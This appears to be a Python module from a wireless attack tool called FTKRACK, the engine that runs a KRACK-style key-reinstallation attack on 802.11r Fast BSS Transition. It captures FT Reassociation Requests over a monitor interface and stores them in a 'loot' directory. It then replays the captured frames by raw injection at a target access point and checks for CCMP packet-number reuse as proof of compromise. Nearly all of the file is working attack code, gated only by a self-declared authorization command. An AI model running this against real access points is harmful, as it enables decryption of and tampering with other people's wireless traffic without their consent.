"""FTKRACK state machine.

The engine owns the monitor socket.  The UI only reads state.json and appends
commands to cmd.jsonl, so a UI crash can never touch the radio interface.

Honest status rules (nothing here is inferred from intent):
  * monitor = 'none' unless sysfs confirms an ARPHRD 803 radiotap interface
              and the AF_PACKET socket opened successfully.
  * capture = set only when a structurally valid FT Reassociation Request was
              actually received from the air.
  * replay  = counts only whole frames the kernel accepted on inject().
  * response = set only when a status-0 Reassociation Response from the target
               AP was actually received after replay began.
  * pn/proof = PN reuse or regression must be observed in real AP data frames.
               No capture, no replay, no response, no reuse => no success.
"""

from __future__ import annotations

import json
import math
import os
import time
from typing import Optional

from . import capture as capmod
from . import dot11, inject

STATE = os.environ.get("FTKRACK_STATE", "/tmp/ftkrack_state.json")
CMD = os.environ.get("FTKRACK_CMD", "/tmp/ftkrack_cmd.jsonl")
LOOT = os.environ.get("FTKRACK_LOOT", "/root/loot/ftkrack")

COUNT_CHOICES = (1, 3, 5, 10)


def _finite_number(value) -> Optional[float]:
    """Parse a bounded, finite number from a UI command.  No inf/NaN ever."""
    try:
        result = float(value)
    except (TypeError, ValueError, OverflowError):
        return None
    return result if math.isfinite(result) else None


def default_state() -> dict:
    return {
        "authorized": False,
        "phase": "idle",
        "iface": "wlan1mon",
        "monitor": "none",
        "target": {"bssid": "", "ssid": ""},
        "capture": {
            "captured": False, "frames_seen": 0, "ft_requests": 0,
            "ssid": "", "sta": "", "mdid": None, "snonce": None,
            "anonce": None, "mic": None, "channel_hz": 0,
            "signal_dbm": None, "raw_len": 0,
        },
        "replay": {"attempted": False, "frames": 0, "write_errors": 0,
                   "kernel_accepted": False, "count": 3, "last_error": ""},
        "response": {"observed": False, "status": None, "aid": None,
                     "count": 0},
        "pn": {"before": 0, "before_max": 0, "after": 0, "after_max": 0,
               "reuse_exact": 0, "regression": 0},
        "proof": {"confirmed": False, "detail": "no evidence yet",
                  "reasons": ["attack not run"]},
        "logs": ["FTKRACK ready. Authorize before any capture or replay."],
        "error": "",
        "seq": 0,
    }


class Engine:
    def __init__(self, injector=None, state_path=None, cmd_path=None, loot=None):
        self.state_path = state_path or STATE
        self.cmd_path = cmd_path or CMD
        self.loot = loot or LOOT
        self.injector = injector
        self.state = default_state()
        self.capture = capmod.CaptureEngine()
        self.running = True
        self.sniff_until = 0.0

    # ------------------------------------------------------------------
    def log(self, message: str):
        self.state["logs"] = (self.state["logs"] + [message])[-40:]
        try:
            os.makedirs(self.loot, exist_ok=True)
            with open(os.path.join(self.loot, "ftkrack.log"), "a") as fh:
                fh.write(f"{time.strftime('%FT%TZ', time.gmtime())} {message}\n")
        except OSError:
            pass

    def save(self):
        self.state["seq"] += 1
        try:
            tmp = self.state_path + ".tmp"
            with open(tmp, "w") as fh:
                json.dump(self.state, fh, separators=(",", ":"))
            os.replace(tmp, self.state_path)
        except OSError:
            pass

    def _refresh(self):
        snap = self.capture.snapshot()
        self.state["capture"].update({
            "captured": snap["captured"],
            "frames_seen": snap["frames_seen"],
            "ft_requests": snap["ft_requests"],
            "ssid": snap["ssid"], "sta": snap["sta"], "mdid": snap["mdid"],
            "snonce": snap["snonce"], "anonce": snap["anonce"],
            "mic": snap["mic"], "channel_hz": snap["channel_hz"],
            "signal_dbm": snap["signal_dbm"], "raw_len": snap["raw_len"],
        })
        self.state["target"]["bssid"] = snap["target_bssid"]
        if snap["ssid"] and not self.state["target"]["ssid"]:
            self.state["target"]["ssid"] = snap["ssid"]
        self.state["pn"].update({
            "before": snap["pn_before_count"], "before_max": snap["pn_before_max"],
            "after": snap["pn_after_count"], "after_max": snap["pn_after_max"],
            "reuse_exact": snap["pn_reuse_exact"],
            "regression": snap["pn_regression"],
        })
        self.state["replay"]["kernel_accepted"] = snap["replay_accepted"]
        self.state["response"].update({
            "count": snap["responses_after_replay"],
            "observed": bool(snap["responses_after_replay"]),
        })
        last = next((r for r in reversed(self.capture.responses)
                     if r.get("after_replay") and r.get("success")), None)
        if last:
            self.state["response"].update({
                "status": last.get("status"), "aid": last.get("aid")})
        self.state["proof"] = snap["proof"]

    def _reset_evidence(self, count: int = 3):
        """Wipe all attack evidence while preserving the operator's count."""
        self.state["replay"] = default_state()["replay"]
        self.state["replay"]["count"] = count
        self.state["response"] = default_state()["response"]
        self._logged_ft_request = False
        self.sniff_until = 0.0

    # ------------------------------------------------------------------
    def _open_monitor(self) -> bool:
        if self.injector is None:
            if not inject.is_monitor(self.state["iface"]):
                self.state["monitor"] = "none"
                self.log(f"NO MONITOR: {self.state['iface']} is not a radiotap "
                         "monitor interface (need ARPHRD 803).")
                return False
            try:
                dev = inject.MonitorInjector(self.state["iface"])
                dev.open()
                self.injector = dev
                self.state["monitor"] = "ok"
                self.log(f"Monitor ready on {self.state['iface']}.")
                return True
            except inject.MonitorError as exc:
                self.state["monitor"] = "none"
                self.state["error"] = str(exc)
                self.log(f"NO MONITOR: {exc}")
                return False
        self.state["monitor"] = getattr(self.injector, "capability", "mock")
        return True

    def feed(self, buf: bytes) -> Optional[dict]:
        """Process one captured buffer.  Exposed for hardware-free tests."""
        if not self.state["authorized"]:
            return None
        if not self.state["monitor"] or self.state["monitor"] == "none":
            return None
        event = self.capture.feed(buf)
        if event:
            kind = event.get("kind")
            if kind == "reassoc_req" and event.get("ft_valid"):
                req = self.capture.ft_request
                if req and not getattr(self, "_logged_ft_request", False):
                    self.log(f"FT reassoc request: AP={event.get('bssid')} "
                             f"STA={event.get('sta')} MDID={event.get('mdid')} "
                             f"SSID={event.get('ssid')!r}")
                    self._logged_ft_request = True
            elif kind == "reassoc_resp" and event.get("after_replay"):
                self.log(f"Reassoc response after replay: status={event.get('status')}")
            elif kind == "pn" and (event.get("reuse_exact") or event.get("regression")):
                self.log(f"CCMP PN evidence: reuse={event.get('reuse_exact')} "
                         f"regression={event.get('regression')}")
        return event

    # ------------------------------------------------------------------
    def handle(self, cmd: dict):
        action = cmd.get("cmd")
        if action == "stop":
            self.running = False
            return
        if action == "authorize":
            if not self.state["authorized"]:
                self.state["authorized"] = True
                self.log("Authorization accepted. Authorized testing only.")
            return
        if not self.state["authorized"]:
            self.log("Command rejected: not authorized.")
            return

        if action == "iface":
            value = str(cmd.get("value", "")).strip()
            if value:
                if self.injector is not None and hasattr(self.injector, "close"):
                    self.injector.close()
                self.state["iface"] = value
                self.injector = None
                self.state["monitor"] = "none"
                self.capture = capmod.CaptureEngine(
                    self.state["target"]["bssid"] or None)
                self._reset_evidence(self.state["replay"]["count"])
                self.log(f"Interface set to {value}; evidence reset (not opened yet).")
                self._refresh()
                self._save_loot()
            return
        if action == "target":
            value = str(cmd.get("value", "")).strip().lower()
            if dot11.parse_mac(value):
                count = self.state["replay"]["count"]
                self.capture = capmod.CaptureEngine(value)
                self._reset_evidence(count)
                self.state["target"] = {"bssid": value, "ssid": ""}
                self.log(f"Target AP set to {value}; evidence counters reset.")
                self._refresh()
                self._save_loot()
            else:
                self.log("Invalid target BSSID.")
            return
        if action == "autotarget":
            if self.capture.ft_request:
                bssid = self.capture.ft_request["bssid"]
                self.capture.target_bssid = bssid.lower()
                self.state["target"]["bssid"] = bssid
                self.state["target"]["ssid"] = self.capture.ft_request.get("ssid", "")
                self.log(f"Target locked from capture: {bssid}")
                self._refresh()
            else:
                self.log("No captured FT request to lock onto.")
            return
        if action == "monitor":
            self._open_monitor()
            return
        if action == "sniff":
            seconds = _finite_number(cmd.get("seconds", 10))
            if seconds is None:
                self.log("Invalid sniff duration.")
                return
            self._do_sniff(max(0.1, min(300.0, seconds)))
            return
        if action == "clear":
            bssid = self.state["target"]["bssid"] or None
            self.capture = capmod.CaptureEngine(bssid)
            self._reset_evidence(self.state["replay"]["count"])
            self.log("Capture and evidence cleared.")
            self._refresh()
            self._save_loot()
            return
        if action == "count":
            value = _finite_number(cmd.get("value", 3))
            count = int(value) if value is not None else -1
            if count in COUNT_CHOICES:
                self.state["replay"]["count"] = count
                self.log(f"Replay count set to {count}.")
            else:
                self.log("Invalid replay count.")
            return
        if action == "replay":
            value = _finite_number(cmd.get("count", self.state["replay"]["count"]))
            if value is None:
                self.log("Invalid replay count.")
                return
            self._do_replay(int(value))
            return
        if action == "verify":
            self._refresh()
            proof = self.state["proof"]
            self.log("PROOF: " + ("CONFIRMED - " if proof["confirmed"] else "UNCONFIRMED - ")
                     + proof["detail"])
            self._save_loot()
            return

    def _do_sniff(self, seconds: float):
        self.state["phase"] = "sniff"
        if not self._open_monitor():
            self.state["phase"] = "idle"
            return
        self.sniff_until = time.monotonic() + max(0.1, seconds)
        self.log(f"Sniffing {seconds:.0f}s on {self.state['iface']} for FT reassoc requests.")
        self._refresh()
        self.save()

    def _do_replay(self, count: int):
        self.state["phase"] = "replay"
        req = self.capture.ft_request
        if not req:
            self.log("REPLAY blocked: no valid FT reassociation request captured.")
            self.state["phase"] = "idle"
            return
        target = self.state["target"]["bssid"]
        if target and req["bssid"].lower() != target.lower():
            self.log(f"REPLAY blocked: captured AP {req['bssid']} != target {target}.")
            self.state["phase"] = "idle"
            return
        if not self._open_monitor():
            self.state["phase"] = "idle"
            return
        count = max(1, min(10, count))
        frame = dot11.build_radiotap_inject() + req["raw"]
        ok = 0
        errors = 0
        for _ in range(count):
            try:
                if self.injector.inject(frame):
                    ok += 1
                else:
                    errors += 1
            except Exception as exc:  # noqa: BLE001 - report any socket failure
                errors += 1
                self.state["replay"]["last_error"] = str(exc)
        self.state["replay"].update({
            "attempted": True,
            "frames": self.state["replay"]["frames"] + ok,
            "write_errors": self.state["replay"]["write_errors"] + errors,
            "count": count,
        })
        self.capture.note_replay(ok)
        self.sniff_until = time.monotonic() + capmod.REPLAY_WINDOW_S
        self.log(f"Replay sent {ok} frame(s) ({len(frame)} bytes each), "
                 f"write errors={errors}. Watching for AP response and PN reuse.")
        self.state["phase"] = "idle"
        self._refresh()
        self._save_loot()

    # ------------------------------------------------------------------
    def _save_loot(self):
        try:
            os.makedirs(self.loot, exist_ok=True)
            with open(os.path.join(self.loot, "capture.json"), "w") as fh:
                json.dump(self.capture.snapshot(), fh, indent=2)
            with open(os.path.join(self.loot, "result.json"), "w") as fh:
                json.dump({k: self.state[k] for k in
                           ("replay", "response", "pn", "proof")}, fh, indent=2)
            req = self.capture.ft_request
            if req:
                with open(os.path.join(self.loot, "reassoc-request.bin"), "wb") as fh:
                    fh.write(req["raw"])
        except (OSError, TypeError, ValueError):
            pass

    def drain_commands(self):
        try:
            with open(self.cmd_path, "r") as fh:
                lines = fh.readlines()
        except OSError:
            return
        if not lines:
            return
        for line in lines:
            try:
                self.handle(json.loads(line))
            except (ValueError, TypeError, KeyError, AttributeError,
                    OverflowError):
                continue
        try:
            open(self.cmd_path, "w").close()
        except OSError:
            pass

    def run(self):
        open(self.cmd_path, "a").close()
        self.save()
        last_save = 0.0
        while self.running:
            self.drain_commands()
            if self.injector is not None and self.sniff_until > time.monotonic():
                buf = self.injector.recv_frame()
                if buf:
                    self.feed(buf)
            now = time.monotonic()
            if now - last_save >= 0.2:
                self._refresh()
                self.save()
                last_save = now
            time.sleep(0.02)
        if self.injector is not None and getattr(self.injector, "close", None):
            self.injector.close()
